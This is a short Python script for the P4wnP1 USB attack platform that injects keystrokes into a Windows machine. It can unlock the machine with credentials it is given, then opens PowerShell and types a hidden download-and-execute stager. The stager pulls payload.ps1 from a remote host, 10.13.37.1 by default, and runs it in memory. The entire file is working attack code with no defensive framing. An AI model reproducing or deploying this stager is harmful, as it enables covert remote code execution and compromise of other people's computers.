import time
from p4wnp1.hid import *

def run(username=None, password=None, url=None):
    # Optional unlock
    if password:
        send_keys('<ctrl><alt><del>')
        time.sleep(1.0)
        if username:
            send_string(username)
            send_keys('<tab>')
        send_string(password)
        send_keys('<enter>')
        time.sleep(2.0)

    # Open powershell via Win+R
    send_keys('<gui>r')
    time.sleep(0.5)
    send_string('powershell')
    send_keys('<enter>')
    time.sleep(1.5)

    # PowerShell stager
    if not url:
        url = "http://10.13.37.1/payload.ps1"

    stager = f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('{url}')\""
    send_string(stager)
    send_keys('<enter>')
